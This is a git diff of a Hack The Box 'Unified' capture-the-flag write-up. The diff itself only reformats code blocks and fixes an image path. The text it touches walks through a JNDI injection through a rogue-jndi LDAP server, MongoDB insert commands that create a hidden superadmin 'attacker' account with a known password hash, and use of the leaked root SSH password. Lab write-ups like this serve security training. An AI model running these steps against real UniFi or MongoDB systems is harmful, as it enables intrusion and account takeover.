@@ -79,7 +79,7 @@ With all these things in place, the last step is to send the payload to the vuln
 }
 ```
 This sends a `LDAP-JNDI` request to my `rogue-jndi` server, where it asks for the object `o=tomcat` (this is `rogue-jndi` specific. We know that `Tomcat` is the back-end thanks to `nmap -sC`). And this is how it looks all together:
-![](../../../Images/HTB_Images/StartingPoint/Unified.png)
+![](/twlttrtxt-notes/Images/HTB_Images/StartingPoint/Unified.png)
 
 This image shows that the command execution worked! 
 
@@ -218,9 +218,9 @@ We need to first create a hash which will be inserted as the value of the `"x_sh
 mkpasswd -m sha-512 password123
 ```
 This gives us the hash we can use. To add the new user, we need to connect to the database again and modify the `admin` collection within the `ace` database using the following `mongo` command (the `_id` is optional):
- ```bash
- db.admin.insert({"email":"attacker@unified.htb","name":"attacker","x_shadow":"$6$S1T0uYEF.r9PmihP$UR1iCN3Akhpp8U5GfNREIlb8JiA8i3jWYrcPNmUc/QL9hhqQDQcf8hlU5MWIcN69bi8sWibIJtJ5J9091sL101","requires_new_password":false,"time_created":NumberLong(1640910161),"last_site_name":"default", "isSuperAdmin":true})
- ```
+```bash
+db.admin.insert({"email":"attacker@unified.htb","name":"attacker","x_shadow":"$6$S1T0uYEF.r9PmihP$UR1iCN3Akhpp8U5GfNREIlb8JiA8i3jWYrcPNmUc/QL9hhqQDQcf8hlU5MWIcN69bi8sWibIJtJ5J9091sL101","requires_new_password":false,"time_created":NumberLong(1640910161),"last_site_name":"default", "isSuperAdmin":true})
+```
 You can replace the `x_shadow` value if you desire another password.
 
 This alone does not give you access to the web page (it messes the page up if you try to access it), as you need to also modify the `privilege` collection to state what privileges the new user has! Entries of that collection look like this
@@ -233,9 +233,9 @@ This alone does not give you access to the web page (it messes the page up if yo
 }
 ```
 The `admin_id` is the value of the `_id` parameter of a user found in the `admin` collection, and the `site_id` is the value of a website found in the `site` collection (there are 2 sites!!!). To add our newly created account to the `privilege` collection, the corresponding `_id` which was automatically generated must be copied from the `admin` collection. Using that, the following `mongo` command adds the new user `attacker` to the `privilege` collection:
- ```bash
- db.privilege.insert({"admin_id":"<attackers-ID>","site_id":"<sites-ID>","permissions":[],"role":"admin"})
- ```
+```bash
+db.privilege.insert({"admin_id":"<attackers-ID>","site_id":"<sites-ID>","permissions":[],"role":"admin"})
+```
 Make sure to execute this command twice for both available sites in the `site` collection!
 
 After inserting all the values into the `ace` database (edited collections `admin` and `privilege`), it is now possible to login to the application using the new credentials `attacker:password123`. The hint `Not seeing everything you need? Go to classic dashboard` show up. And indeed, i am not seeing everything, so i click the blue link. In the settings, i disable the button `New User Interface`. Using the old interface, i navigate to `Settings > Site > Device Authentication`, where i find the `SSH` password for the `root` user! I can use `ssh root@$IP` to login and read the `/root/root.txt` flag!
